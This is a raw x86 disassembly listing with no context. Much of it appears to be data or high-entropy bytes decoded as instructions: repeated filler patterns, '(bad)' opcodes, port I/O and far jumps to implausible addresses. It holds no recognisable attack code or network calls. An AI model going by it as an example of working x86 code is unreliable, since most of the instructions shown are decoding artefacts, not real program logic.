  44f00f:	jmp    0xe953a2a7
  44f014:	xchg   ebx,eax
  44f015:	mov    dl,0xe
  44f017:	jmp    0xe953a2af
  44f01c:	xchg   ebx,eax
  44f01d:	mov    dl,0xe
  44f01f:	jmp    0xe953a2b7
  44f024:	xchg   ebx,eax
  44f025:	mov    dl,0xe
  44f027:	jmp    0xe953a2bf
  44f02c:	xchg   ebx,eax
  44f02d:	mov    dl,0xe
  44f02f:	jmp    0x44f034
  44f034:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44f03a:	mov    dl,0xe
  44f03c:	jmp    0xe953a2d4
  44f041:	xchg   ebx,eax
  44f042:	mov    dl,0xe
  44f044:	jmp    0xe953a2dc
  44f049:	xchg   ebx,eax
  44f04a:	mov    dl,0xe
  44f04c:	jmp    0xe953a2e4
  44f051:	xchg   ebx,eax
  44f052:	mov    dl,0xe
  44f054:	jmp    0x53a2ec
  44f059:	cmp    DWORD PTR [esi+ecx*1+0xeb43900],esi
  44f060:	add    BYTE PTR [ecx],ch
  44f062:	mov    ah,0xe
  44f064:	add    BYTE PTR [ecx],ch
  44f066:	mov    ah,0xe
  44f068:	add    BYTE PTR [ecx],bh
  44f06a:	mov    ah,0xe
  44f06c:	add    BYTE PTR [ecx],bh
  44f06e:	mov    ah,0xe
  44f070:	add    BYTE PTR [ecx],ch
  44f072:	mov    ah,0xe
  44f074:	add    BYTE PTR [ecx],ch
  44f076:	mov    ah,0xe
  44f078:	add    cl,bh
  44f07a:	mov    bl,0xe
  44f07c:	add    cl,bh
  44f07e:	mov    bl,0xe
  44f080:	add    cl,ch
  44f082:	mov    bl,0xe
  44f084:	add    cl,ch
  44f086:	mov    bl,0xe
  44f088:	add    cl,bh
  44f08a:	mov    bl,0xe
  44f08c:	add    cl,bh
  44f08e:	mov    bl,0xe
  44f090:	add    cl,ch
  44f092:	mov    bl,0xe
  44f094:	add    cl,ch
  44f096:	mov    bl,0xe
  44f098:	add    BYTE PTR [eax],al
  44f09a:	add    BYTE PTR [eax],al
  44f09c:	add    BYTE PTR [eax],al
  44f09e:	mov    ecx,0xb9000eb3
  44f0a3:	mov    bl,0xe
  44f0a5:	add    BYTE PTR [ecx-0x56fff14d],ch
  44f0ab:	mov    bl,0xe
  44f0ad:	add    BYTE PTR [ecx-0x46fff14d],bh
  44f0b3:	mov    bl,0xe
  44f0b5:	add    BYTE PTR [ecx-0x56fff14d],ch
  44f0bb:	mov    bl,0xe
  44f0bd:	add    BYTE PTR [ecx-0x4d],bh
  44f0c0:	push   cs
  44f0c1:	add    BYTE PTR [ecx-0x4d],bh
  44f0c4:	push   cs
  44f0c5:	add    BYTE PTR [ecx-0x4d],ch
  44f0c8:	push   cs
  44f0c9:	add    BYTE PTR [ecx-0x4d],ch
  44f0cc:	push   cs
  44f0cd:	add    BYTE PTR [ecx-0x4d],bh
  44f0d0:	push   cs
  44f0d1:	add    BYTE PTR [ecx-0x4d],bh
  44f0d4:	push   cs
  44f0d5:	add    BYTE PTR [eax-0x6ffff3e7],dl
  44f0db:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0de:	nop
  44f0df:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0e2:	nop
  44f0e3:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0e6:	nop
  44f0e7:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0ea:	nop
  44f0eb:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0ee:	nop
  44f0ef:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0f2:	nop
  44f0f3:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0f6:	nop
  44f0f7:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0fa:	nop
  44f0fb:	sbb    DWORD PTR [eax+eax*1],ecx
  44f0fe:	nop
  44f0ff:	sbb    DWORD PTR [eax+eax*1],ecx
  44f102:	add    BYTE PTR [eax],al
  44f104:	add    BYTE PTR [eax],al
  44f106:	add    BYTE PTR [eax-0x6ffff3e7],dl
  44f10c:	sbb    DWORD PTR [eax+eax*1],ecx
  44f10f:	nop
  44f110:	sbb    DWORD PTR [eax+eax*1],ecx
  44f113:	nop
  44f114:	sbb    DWORD PTR [eax+eax*1],ecx
  44f117:	nop
  44f118:	sbb    DWORD PTR [eax+eax*1],ecx
  44f11b:	nop
  44f11c:	sbb    DWORD PTR [eax+eax*1],ecx
  44f11f:	nop
  44f120:	sbb    DWORD PTR [eax+eax*1],ecx
  44f123:	nop
  44f124:	sbb    DWORD PTR [eax+eax*1],ecx
  44f127:	nop
  44f128:	sbb    DWORD PTR [eax+eax*1],ecx
  44f12b:	nop
  44f12c:	sbb    DWORD PTR [eax+eax*1],ecx
  44f12f:	nop
  44f130:	sbb    DWORD PTR [eax+eax*1],ecx
  44f133:	nop
  44f134:	sbb    DWORD PTR [eax+eax*1],ecx
  44f137:	nop
  44f138:	sbb    DWORD PTR [eax+eax*1],ecx
  44f13b:	nop
  44f13c:	sbb    DWORD PTR [eax+eax*1],ecx
  44f13f:	nop
  44f140:	sbb    DWORD PTR [eax+eax*1],ecx
  44f143:	nop
  44f144:	sbb    ecx,DWORD PTR [eax+eax*1]
  44f147:	nop
  44f148:	sbb    ecx,DWORD PTR [eax+eax*1]
  44f14b:	nop
  44f14c:	sbb    ecx,DWORD PTR [eax+eax*1]
  44f14f:	nop
  44f150:	sbb    ecx,DWORD PTR [eax+eax*1]
  44f153:	nop
  44f154:	mov    dl,0xf5
  44f156:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f15c:	mov    dl,0xf5
  44f15e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f164:	mov    dl,0xf5
  44f166:	add    edx,DWORD PTR [eax+0x3f5b2]
  44f16c:	add    BYTE PTR [eax],al
  44f16e:	add    BYTE PTR [eax],al
  44f170:	nop
  44f171:	mov    dl,0xf5
  44f173:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f179:	mov    dl,0xf5
  44f17b:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f181:	mov    dl,0xf5
  44f183:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f189:	mov    dl,0xf5
  44f18b:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f191:	mov    dl,0xf5
  44f193:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f199:	mov    dl,0xf5
  44f19b:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f1a1:	mov    dl,0xf5
  44f1a3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f1a9:	mov    dl,0xf5
  44f1ab:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f1b1:	mov    dl,0xf5
  44f1b3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f1b9:	mov    dl,0xf5
  44f1bb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f1c1:	mov    dl,0xf5
  44f1c3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f1c9:	mov    dl,0xf5
  44f1cb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44f1d1:	mov    dl,0xe
  44f1d3:	jmp    0x44f1d8
  44f1d8:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44f1de:	mov    dl,0xe
  44f1e0:	jmp    0xe953a478
  44f1e5:	xchg   ebx,eax
  44f1e6:	mov    dl,0xe
  44f1e8:	jmp    0xe953a480
  44f1ed:	xchg   ebx,eax
  44f1ee:	mov    dl,0xe
  44f1f0:	jmp    0xe953a488
  44f1f5:	xchg   ebx,eax
  44f1f6:	mov    dl,0xe
  44f1f8:	jmp    0xe953a490
  44f1fd:	xchg   ebx,eax
  44f1fe:	mov    dl,0xe
  44f200:	jmp    0xe953a498
  44f205:	xchg   ebx,eax
  44f206:	mov    dl,0xe
  44f208:	jmp    0xe953a4a0
  44f20d:	xchg   ebx,eax
  44f20e:	mov    dl,0xe
  44f210:	jmp    0xe953a4a8
  44f215:	xchg   ebx,eax
  44f216:	mov    dl,0xe
  44f218:	jmp    0xe953a4b0
  44f21d:	xchg   ebx,eax
  44f21e:	mov    dl,0xe
  44f220:	jmp    0xe953a4b8
  44f225:	xchg   ebx,eax
  44f226:	mov    dl,0xe
  44f228:	jmp    0xe953a4c0
  44f22d:	xchg   ebx,eax
  44f22e:	mov    dl,0xe
  44f230:	jmp    0xe953a4c8
  44f235:	xchg   ebx,eax
  44f236:	mov    dl,0xe
  44f238:	jmp    0xe953a4d0
  44f23d:	add    BYTE PTR [eax],al
  44f23f:	add    BYTE PTR [eax],al
  44f241:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44f247:	mov    dl,0xe
  44f249:	jmp    0xe953a4e1
  44f24e:	xchg   ebx,eax
  44f24f:	mov    dl,0xe
  44f251:	jmp    0x53a4e9
  44f256:	jns    0x44f208
  44f258:	push   cs
  44f259:	add    BYTE PTR [ecx-0x50],ch
  44f25c:	push   cs
  44f25d:	add    BYTE PTR [ecx-0x50],ch
  44f260:	push   cs
  44f261:	add    BYTE PTR [ecx-0x50],bh
  44f264:	push   cs
  44f265:	add    BYTE PTR [ecx-0x50],bh
  44f268:	push   cs
  44f269:	add    BYTE PTR [ecx-0x50],ch
  44f26c:	push   cs
  44f26d:	add    BYTE PTR [ecx-0x50],ch
  44f270:	push   cs
  44f271:	add    BYTE PTR [ecx],bh
  44f273:	mov    al,0xe
  44f275:	add    BYTE PTR [ecx],bh
  44f277:	mov    al,0xe
  44f279:	add    BYTE PTR [ecx],ch
  44f27b:	mov    al,0xe
  44f27d:	add    BYTE PTR [ecx],ch
  44f27f:	mov    al,0xe
  44f281:	add    BYTE PTR [ecx],bh
  44f283:	mov    al,0xe
  44f285:	add    BYTE PTR [ecx],bh
  44f287:	mov    al,0xe
  44f289:	add    BYTE PTR [ecx],ch
  44f28b:	mov    al,0xe
  44f28d:	add    BYTE PTR [ecx],ch
  44f28f:	mov    al,0xe
  44f291:	add    cl,bh
  44f293:	scas   eax,DWORD PTR es:[edi]
  44f294:	push   cs
  44f295:	add    cl,bh
  44f297:	scas   eax,DWORD PTR es:[edi]
  44f298:	push   cs
  44f299:	add    cl,ch
  44f29b:	scas   eax,DWORD PTR es:[edi]
  44f29c:	push   cs
  44f29d:	add    cl,ch
  44f29f:	scas   eax,DWORD PTR es:[edi]
  44f2a0:	push   cs
  44f2a1:	add    cl,bh
  44f2a3:	scas   eax,DWORD PTR es:[edi]
  44f2a4:	push   cs
  44f2a5:	add    BYTE PTR [eax],al
  44f2a7:	add    BYTE PTR [eax],al
  44f2a9:	add    BYTE PTR [eax],al
  44f2ab:	stc    
  44f2ac:	scas   eax,DWORD PTR es:[edi]
  44f2ad:	push   cs
  44f2ae:	add    cl,ch
  44f2b0:	scas   eax,DWORD PTR es:[edi]
  44f2b1:	push   cs
  44f2b2:	add    cl,ch
  44f2b4:	scas   eax,DWORD PTR es:[edi]
  44f2b5:	push   cs
  44f2b6:	add    BYTE PTR [ecx-0x46fff151],bh
  44f2bc:	scas   eax,DWORD PTR es:[edi]
  44f2bd:	push   cs
  44f2be:	add    BYTE PTR [ecx-0x56fff151],ch
  44f2c4:	scas   eax,DWORD PTR es:[edi]
  44f2c5:	push   cs
  44f2c6:	add    BYTE PTR [ecx-0x46fff151],bh
  44f2cc:	scas   eax,DWORD PTR es:[edi]
  44f2cd:	push   cs
  44f2ce:	add    BYTE PTR [ecx-0x6ffff151],ch
  44f2d4:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2d7:	nop
  44f2d8:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2db:	nop
  44f2dc:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2df:	nop
  44f2e0:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2e3:	nop
  44f2e4:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2e7:	nop
  44f2e8:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2eb:	nop
  44f2ec:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2ef:	nop
  44f2f0:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2f3:	nop
  44f2f4:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2f7:	nop
  44f2f8:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2fb:	nop
  44f2fc:	sbb    DWORD PTR [eax+eax*1],ecx
  44f2ff:	nop
  44f300:	sbb    DWORD PTR [eax+eax*1],ecx
  44f303:	nop
  44f304:	sbb    DWORD PTR [eax+eax*1],ecx
  44f307:	nop
  44f308:	sbb    DWORD PTR [eax+eax*1],ecx
  44f30b:	nop
  44f30c:	sbb    DWORD PTR [eax+eax*1],ecx
  44f30f:	add    BYTE PTR [eax],al
  44f311:	add    BYTE PTR [eax],al
  44f313:	add    BYTE PTR [eax-0x6ffff3e7],dl
  44f319:	jg     0x91750ecd
  44f31f:	and    edi,DWORD PTR [ecx]
  44f321:	loopne 0x44f2fb
  44f323:	push   esp
  44f324:	fld    QWORD PTR [esi-0x347906a7]
  44f32a:	xchg   esi,eax
  44f32b:	test   al,dh
  44f32d:	outs   dx,DWORD PTR ds:[esi]
  44f32e:	loope  0x44f2f4
  44f330:	sbb    esi,DWORD PTR [edx-0x7b]
  44f333:	lods   al,BYTE PTR ds:[esi]
  44f334:	xor    al,0x21
  44f336:	sbb    DWORD PTR [edi-0x3281ca82],edx
  44f33c:	jnp    0x44f392
  44f33e:	or     esi,0xffffffbc
  44f341:	lahf   
  44f342:	mov    cl,0x93
  44f344:	xchg   edx,eax
  44f345:	sbb    al,0xf3
  44f347:	lds    ebx,FWORD PTR [ecx-0x20]
  44f34a:	xor    BYTE PTR [edi+0xa],ch
  44f34d:	outs   dx,BYTE PTR ds:[esi]
  44f34e:	ficomp WORD PTR [eax+0x5f56b200]
  44f354:	out    dx,eax
  44f355:	or     eax,0xdae1579f
  44f35a:	repnz push ebx
  44f35c:	jns    0x44f348
  44f35e:	test   DWORD PTR [ecx-0x41c5d90d],edi
  44f364:	adc    al,0xf1
  44f366:	sub    ah,BYTE PTR [edi-0x61e9578b]
  44f36c:	stos   BYTE PTR es:[edi],al
  44f36d:	push   ebp
  44f36e:	mov    bh,0x65
  44f370:	xchg   edi,eax
  44f371:	mov    bh,0xf8
  44f373:	cdq    
  44f374:	mov    DWORD PTR [ebx],ebx
  44f376:	rcr    DWORD PTR ds:0x0,1
  44f37c:	add    BYTE PTR [ebx+edi*4-0x7874b816],al
  44f383:	push   ecx
  44f384:	push   ebp
  44f385:	(bad)  
  44f386:	dec    esp
  44f387:	mov    ?,WORD PTR [ebp+0x9a2a310]
  44f38d:	pop    ss
  44f38e:	sbb    al,al
  44f390:	sub    BYTE PTR [ecx-0xfff5523],bh
  44f396:	pop    ebp
  44f397:	retf   
  44f398:	sub    edx,DWORD PTR [edx+ecx*1-0x5a]
  44f39c:	xchg   edx,eax
  44f39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f39e:	(bad)  
  44f3a0:	mov    ebp,DWORD PTR [edx+0x50a5ff2]
  44f3a6:	cmp    BYTE PTR [edi],0x99
  44f3a9:	jmp    0x44f36b
  44f3ab:	jne    0x44f369
  44f3ad:	cld    
  44f3ae:	out    0x38,al
  44f3b0:	jge    0x44f3d7
  44f3b2:	and    eax,0x8516e97b
  44f3b7:	out    0x40,al
  44f3b9:	repz pop edx
  44f3bb:	ret    0x4e64
  44f3be:	fs mov bh,0x3
  44f3c1:	and    BYTE PTR [ebp+0x1d094f91],0x54
  44f3c8:	mov    esi,0xd5931ff3
  44f3cd:	jnp    0x44f3b6
  44f3cf:	push   cs
  44f3d0:	test   al,0xd3
  44f3d2:	inc    edx
  44f3d3:	adc    ebx,DWORD PTR [ecx]
  44f3d5:	add    eax,0xd5938b1c
  44f3da:	push   cs
  44f3db:	stc    
  44f3dc:	ret    0xe6c6
  44f3df:	fdiv   QWORD PTR [ecx]
  44f3e1:	add    BYTE PTR [eax],al
  44f3e3:	add    BYTE PTR [eax],al
  44f3e5:	add    BYTE PTR [eax],ah
  44f3e7:	xchg   ebx,eax
  44f3e8:	sbb    eax,0x459dafe5
  44f3ed:	loopne 0x44f38f
  44f3ef:	jg     0x44f399
  44f3f1:	xchg   edx,eax
  44f3f2:	(bad)  
  44f3f3:	push   ebp
  44f3f4:	adc    eax,0x1f79fff5
  44f3f9:	pop    esp
  44f3fa:	mov    WORD PTR [edi-0x4f],?
  44f3fd:	sbb    al,0x8a
  44f3ff:	mov    cl,0x6
  44f401:	pop    ebp
  44f402:	aad    0xdf
  44f404:	xchg   edi,eax
  44f405:	and    ecx,ebx
  44f407:	ss int 0x77
  44f40a:	ss mov edi,0x1d32629d
  44f410:	sub    BYTE PTR [ebx-0x7a],0xaf
  44f414:	stos   DWORD PTR es:[edi],eax
  44f415:	shr    bh,0x93
  44f418:	sub    eax,0x3da98bcc
  44f41d:	adc    BYTE PTR [ebx],0x51
  44f420:	dec    edi
  44f421:	push   cs
  44f422:	pop    ebx
  44f423:	ret    0x7c8f
  44f426:	in     eax,0x93
  44f428:	int3   
  44f429:	mov    eax,ds:0xa7cd0d29
  44f42e:	or     BYTE PTR [edi],dh
  44f430:	fist   DWORD PTR [eax+0x4a]
  44f433:	mov    ah,0x9f
  44f435:	mov    edi,0xdc001c6
  44f43a:	repnz adc esi,eax
  44f43d:	ja     0x44f410
  44f43f:	sahf   
  44f440:	pop    ss
  44f441:	pop    ss
  44f442:	lods   eax,DWORD PTR ds:[esi]
  44f443:	lea    edi,[ecx+0x62483e55]
  44f449:	jne    0x44f44b
  44f44b:	add    BYTE PTR [eax],al
  44f44d:	add    BYTE PTR [eax],al
  44f44f:	push   esp
  44f450:	pop    ebx
  44f451:	leave  
  44f452:	add    BYTE PTR [esi],cl
  44f454:	pop    ebx
  44f455:	cmp    edi,DWORD PTR [edi]
  44f457:	jp     0x44f47a
  44f459:	leave  
  44f45a:	(bad)  
  44f45b:	imul   eax,DWORD PTR [eax+0x2b83f509],0x23
  44f462:	imul   edi,edx,0xe8c3ea8c
  44f468:	loop   0x44f4c2
  44f46a:	push   ebp
  44f46b:	test   BYTE PTR [ebx+ebx*4],ch
  44f46e:	call   0x9374:0x4e0a170d
  44f475:	das    
  44f476:	daa    
  44f477:	mov    ds:0x2f905242,eax
  44f47c:	leave  
  44f47d:	mov    WORD PTR [edi],?
  44f47f:	xlat   BYTE PTR ds:[ebx]
  44f480:	stos   DWORD PTR es:[edi],eax
  44f481:	or     al,0x9
  44f483:	test   eax,0xc5470300
  44f488:	mov    ebp,0xa2efa443
  44f48d:	adc    DWORD PTR [eax],esp
  44f48f:	ror    BYTE PTR [ebp-0xa25cc2e],cl
  44f495:	fcmovnu st,st(3)
  44f497:	hlt    
  44f498:	in     al,0x36
  44f49a:	jnp    0x44f497
  44f49c:	dec    edx
  44f49d:	or     BYTE PTR [ecx+0x1c],cl
  44f4a0:	cmp    edi,esi
  44f4a2:	mov    dl,0x52
  44f4a4:	or     bl,BYTE PTR [ebp+edi*8-0x2e]
  44f4a8:	jns    0x44f49f
  44f4aa:	mov    ss:0xd772bfd6,eax
  44f4b0:	pop    edx
  44f4b1:	out    dx,eax
  44f4b2:	fild   DWORD PTR [eax]
  44f4b4:	add    BYTE PTR [eax],al
  44f4b6:	add    BYTE PTR [eax],al
  44f4b8:	xchg   DWORD PTR [ecx],edi
  44f4ba:	xchg   DWORD PTR [esi-0x2dc221d4],ecx
  44f4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f4c1:	push   esi
  44f4c2:	mov    bh,0x37
  44f4c4:	push   edi
  44f4c5:	cmp    al,0xab
  44f4c7:	xchg   ebp,eax
  44f4c8:	mov    edx,0xf1a83008
  44f4cd:	push   eax
  44f4ce:	rcl    BYTE PTR [ecx-0x70],0xa3
  44f4d2:	out    0x4e,al
  44f4d4:	(bad)  
  44f4d5:	jp     0x44f4c5
  44f4d7:	jne    0x44f4ef
  44f4d9:	fnsave [edi-0x71]
  44f4dc:	cmp    DWORD PTR [edi-0x19],0x57
  44f4e0:	sbb    edx,ebp
  44f4e2:	pop    ebp
  44f4e3:	inc    edx
  44f4e4:	mov    ebx,0x75cb312b
  44f4e9:	clc    
  44f4ea:	inc    eax
  44f4eb:	push   DWORD PTR ds:0xcee8fce1
  44f4f1:	repnz sti 
  44f4f3:	loope  0x44f4c9
  44f4f5:	push   cs
  44f4f6:	mov    edi,0xd3f27bae
  44f4fb:	inc    esi
  44f4fc:	cwde   
  44f4fd:	mov    ds:0x927927e8,eax
  44f502:	outs   dx,BYTE PTR ds:[esi]
  44f503:	sub    dh,BYTE PTR [edx]
  44f505:	add    DWORD PTR [ebx-0x21],edx
  44f508:	mov    dh,0x9d
  44f50a:	dec    edi
  44f50b:	iret   
  44f50c:	jnp    0x44f579
  44f50e:	inc    DWORD PTR [ebx]
  44f510:	jo     0x44f52e
  44f512:	daa    
  44f513:	push   0x1783f167
  44f518:	jbe    0x44f49d
  44f51a:	push   es
  44f51b:	cld    
  44f51c:	add    BYTE PTR [eax],al
  44f51e:	add    BYTE PTR [eax],al
  44f520:	add    BYTE PTR [esi],cl
  44f522:	add    dl,BYTE PTR [ecx+0x55]
  44f525:	retf   
  44f526:	iret   
  44f527:	cld    
  44f528:	jmp    0x17f235c
  44f52d:	ja     0x44f52a
  44f52f:	adc    al,0xd
  44f531:	xchg   esp,eax
  44f532:	and    dl,cl
  44f534:	jns    0x44f4f9
  44f536:	neg    dl
  44f538:	int3   
  44f539:	aam    0xf5
  44f53b:	fcmove st,st(4)
  44f53d:	int3   
  44f53e:	cmc    
  44f53f:	fcmove st,st(4)
  44f541:	(bad)  
  44f542:	cmc    
  44f543:	fcmove st,st(4)
  44f545:	inc    ebp
  44f546:	cmp    edi,ebx
  44f548:	push   ecx
  44f549:	sbb    ebp,DWORD PTR [ebp+0x16]
  44f54c:	mov    cl,BYTE PTR [eax+0xbff5a3a]
  44f552:	or     eax,0x3b65c34a
  44f557:	sti    
  44f558:	push   ecx
  44f559:	pop    esi
  44f55a:	pop    edi
  44f55b:	sbb    ecx,ecx
  44f55d:	xor    al,0x3b
  44f55f:	pop    esi
  44f560:	xor    BYTE PTR [ebx],cl
  44f562:	sbb    BYTE PTR [edx],0x8b
  44f565:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  44f567:	xchg   ebx,eax
  44f568:	inc    esi
  44f569:	cwde   
  44f56a:	cmp    DWORD PTR [edx-0x4],edx
  44f56d:	or     ecx,DWORD PTR [eax+0x325e8b2e]
  44f573:	sub    BYTE PTR [ebx+0x4],ch
  44f576:	scas   al,BYTE PTR es:[edi]
  44f577:	mov    ?,WORD PTR [edi]
  44f579:	fstp   TBYTE PTR [esi+0xc]
  44f57c:	jmp    0x44f5e7
  44f57e:	dec    ax
  44f580:	mov    ebp,DWORD PTR [ebp+0x68]
  44f583:	retf   
  44f584:	int3   
  44f585:	add    BYTE PTR [eax],al
  44f587:	add    BYTE PTR [eax],al
  44f589:	add    ch,al
  44f58b:	cmp    ebx,edi
  44f58d:	xor    DWORD PTR [edi+ecx*8-0x6d],0x45
  44f592:	mov    BYTE PTR [ebx],bh
  44f594:	push   edx
  44f595:	loopne 0x44f5a2
  44f597:	js     0x44f587
  44f599:	mov    esp,ebp
  44f59b:	adc    cl,BYTE PTR [ecx+edx*2]
  44f59e:	test   BYTE PTR [ebx],bh
  44f5a0:	inc    edx
  44f5a1:	in     al,0xb
  44f5a3:	jo     0x44f597
  44f5a5:	mov    ecx,eax
  44f5a7:	mov    cl,BYTE PTR [ebx]
  44f5a9:	dec    ebp
  44f5aa:	cwde   
  44f5ab:	cmp    ebx,DWORD PTR [edx-0x8]
  44f5ae:	sbb    esp,DWORD PTR [eax-0x1a]
  44f5b1:	mov    edx,edx
  44f5b3:	into   
  44f5b4:	or     eax,DWORD PTR [ebp-0x78]
  44f5b7:	cmp    edx,DWORD PTR [edx-0x18]
  44f5ba:	sbb    edi,DWORD PTR [eax-0x1a]
  44f5bd:	mov    esp,DWORD PTR [ecx-0x2e]
  44f5c0:	or     edx,DWORD PTR [ebp-0x78]
  44f5c3:	cmp    eax,DWORD PTR [edx-0x10]
  44f5c6:	or     esi,DWORD PTR [eax-0x1a]
  44f5c9:	mov    ebx,DWORD PTR [eax-0x5a]
  44f5cc:	or     ecx,DWORD PTR [ebp-0x68]
  44f5cf:	cmp    ebx,DWORD PTR [edx-0x4]
  44f5d2:	xlat   BYTE PTR ds:[ebx]
  44f5d3:	outs   dx,DWORD PTR ds:[esi]
  44f5d4:	loop   0x44f5d6
  44f5d6:	nop
  44f5d7:	mov    dl,0xe
  44f5d9:	jmp    0x44f574
  44f5db:	cmp    DWORD PTR [edx-0xc],eax
  44f5de:	adc    esi,ecx
  44f5e0:	or     eax,0x93fe6589
  44f5e5:	inc    ebp
  44f5e6:	mov    eax,0x6bf45a39
  44f5eb:	jp     0x44f5f3
  44f5ed:	jae    0x44f5ef
  44f5ef:	add    BYTE PTR [eax],al
  44f5f1:	add    BYTE PTR [eax],al
  44f5f3:	pop    eax
  44f5f4:	cmp    DWORD PTR [edx-0x10],eax
  44f5f7:	or     esi,DWORD PTR [ecx+0x3b88450b]
  44f5fd:	push   edx
  44f5fe:	fdiv   st(2),st
  44f600:	mov    ah,0x76
  44f602:	lods   al,BYTE PTR ds:[esi]
  44f603:	xchg   ebx,eax
  44f604:	jb     0x44f614
  44f606:	mov    ecx,ebp
  44f608:	out    0x3d,al
  44f60a:	call   0x53a9ef
  44f60f:	adc    ebp,esi
  44f611:	sbb    al,BYTE PTR [ebp-0x74fc80b0]
  44f617:	(bad)  
  44f61a:	inc    ebp
  44f61b:	push   0xe00c9fb5
  44f620:	cmp    ebx,DWORD PTR [edx-0x14]
  44f623:	sbb    ebx,DWORD PTR [edi-0x6]
  44f626:	mov    edx,ebp
  44f628:	push   es
  44f629:	xchg   esp,eax
  44f62a:	add    al,0x20
  44f62c:	mov    cl,0x51
  44f62e:	or     BYTE PTR [ebx],bh
  44f630:	mov    bh,0x93
  44f632:	dec    ebp
  44f633:	and    BYTE PTR [ecx],dh
  44f635:	into   
  44f636:	add    al,0x9
  44f638:	ja     0x44f618
  44f63a:	jmp    0x44f628
  44f63c:	ror    dh,0x8b
  44f63f:	cmc    
  44f640:	retfw  
  44f642:	int3   
  44f643:	aam    0xf5
  44f645:	fcmove st,st(4)
  44f647:	int3   
  44f648:	cmc    
  44f649:	fcmove st,st(4)
  44f64b:	(bad)  
  44f64c:	cmc    
  44f64d:	fcmove st,st(4)
  44f64f:	inc    ebp
  44f650:	cmp    ebx,edi
  44f652:	xor    esp,0xffffffa9
  44f655:	test   BYTE PTR ds:0x0,0x0
  44f65c:	fild   WORD PTR [eax+ebp*8]
  44f65f:	mov    DWORD PTR [ebp+0x1a],ecx
  44f662:	xchg   esp,eax
  44f663:	inc    ebp
  44f664:	mov    eax,0xc729f661
  44f669:	add    al,0xe8
  44f66b:	adc    esp,0xffffffad
  44f66e:	stos   DWORD PTR es:[edi],eax
  44f66f:	aam    0x0
  44f671:	outs   dx,BYTE PTR ds:[esi]
  44f672:	push   cs
  44f673:	push   0x4eb0ec
  44f678:	sbb    esi,DWORD PTR [edi-0xa]
  44f67b:	push   ecx
  44f67c:	lahf   
  44f67d:	sahf   
  44f67e:	ret    0x4cb0
  44f681:	mov    dl,0xab
  44f683:	fadd   DWORD PTR [eax+0x6f]
  44f686:	push   cs
  44f687:	push   0xffffff90
  44f689:	cwde   
  44f68a:	push   cs
  44f68b:	push   0x4eb04c
  44f690:	ja     0x44f630
  44f692:	(bad)  
  44f693:	mov    al,0xd4
  44f695:	mov    dl,0x95
  44f697:	inc    ebp
  44f698:	js     0x44f686
  44f69a:	push   ecx
  44f69b:	cld    
  44f69c:	nop
  44f69d:	mov    dl,0xe
  44f69f:	add    BYTE PTR [ebx-0x46],ch
  44f6a2:	xchg   ebx,eax
  44f6a3:	push   ebp
  44f6a4:	dec    esp
  44f6a5:	xor    ch,cl
  44f6a7:	add    DWORD PTR [ecx],ebx
  44f6a9:	pop    esi
  44f6aa:	jmp    0x7173:0x1706bd83
  44f6b1:	aaa    
  44f6b2:	push   edx
  44f6b3:	cld    
  44f6b4:	sbb    esi,DWORD PTR [edi+0x72938c91]
  44f6ba:	push   cs
  44f6bb:	push   ecx
  44f6bc:	or     ebx,DWORD PTR [esi-0xa]
  44f6bf:	push   edx
  44f6c0:	add    BYTE PTR [eax],al
  44f6c2:	add    BYTE PTR [eax],al
  44f6c4:	add    BYTE PTR [edi],dl
  44f6c6:	sahf   
  44f6c7:	ret    0x54b0
  44f6ca:	mov    dl,0x93
  44f6cc:	dec    ebp
  44f6cd:	add    al,0x3a
  44f6cf:	adc    ecx,DWORD PTR [ebp+0x5342e4]
  44f6d5:	jmp    0x44f6b9
  44f6d7:	xchg   ebx,eax
  44f6d8:	in     eax,0x4d
  44f6da:	out    dx,eax
  44f6db:	fcmove st,st(4)
  44f6dd:	aam    0xf6
  44f6df:	fcmove st,st(4)
  44f6e1:	int3   
  44f6e2:	neg    dl
  44f6e4:	int3   
  44f6e5:	(bad)  
  44f6e6:	neg    dl
  44f6e8:	int3   
  44f6e9:	gs aaa 
  44f6eb:	sti    
  44f6ec:	mov    eax,ds:0x534174
  44f6f1:	jle    0x44f72a
  44f6f3:	dec    edi
  44f6f4:	xor    BYTE PTR [ebx],cl
  44f6f6:	jbe    0x44f70e
  44f6f8:	sbb    DWORD PTR ds:[ebx+0x16],edi
  44f6fc:	pop    ebp
  44f6fd:	shl    esi,cl
  44f6ff:	fcmove st,st(4)
  44f701:	int3   
  44f702:	neg    dl
  44f704:	int3   
  44f705:	(bad)  
  44f706:	neg    dl
  44f708:	int3   
